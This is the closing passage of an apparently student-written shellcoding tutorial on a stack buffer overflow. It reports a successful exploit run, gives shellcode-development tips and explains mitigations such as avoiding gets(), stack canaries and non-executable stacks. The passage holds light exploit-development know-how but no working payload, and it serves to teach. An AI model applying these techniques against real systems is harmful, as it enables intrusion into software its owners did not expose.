<p><a href="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/success.png" target="_blank"><img src="///D://Documents/Actual_Documents/school/school/reveng_independant_study/shellcoding/res/success.png" alt="successful run of exploit.py" style="max-width:100%;"></a></p>
<p>We can now see that the program successfully runs our shellcode and prints SUCCESS! to standard output.</p>
<h2>
<a id="user-content-tips-for-shellcoding" class="anchor" href="#tips-for-shellcoding" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Tips for shellcoding</h2>
<ul>
<li>Develop your exploit with a program. Many headaches will occur if you try to make the string manually.</li>
<li>The byte <code>\xcc</code> is a software breakpoint on the x86 architecture. Put this in your shellcode and gdb will stop execution when it reaches it.</li>
<li>Draw your current understanding of the stack as you go. This will avoid uneeded confusion.</li>
</ul>
<h2>
<a id="user-content-avoiding-this-in-your-own-software" class="anchor" href="#avoiding-this-in-your-own-software" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Avoiding this in your own software</h2>
<p>This vulnerability and exploitation is fairly easy to mitigate with today's hardware and software. To get this exploit to work on Ubuntu 16.04 and gcc 5.4.0, I had to add a bunch of compiler flags and turn off ASLR.</p>
<p>To prevent this vulnerability from happening in the first place, a programmer should not use dangerous functions such as <code>gets()</code>. <code>gcc</code> will give the user a warning if one of these functions are used. More subtle buffer overflows can be part of a programs logic, so it is important to keep the possibility of buffer overflows in mind while developing software.</p>
<p>To mitigate the possibility of exploitation of such a vulnerability, a programmer should use the default settings of <code>gcc</code>. By default, <code>gcc</code> puts stack canaries in your program and flags stack memory as non-executable. These mitigations greatly complicate the process of developing an exploit for a vulnerable piece of software.</p>
</article></body></html>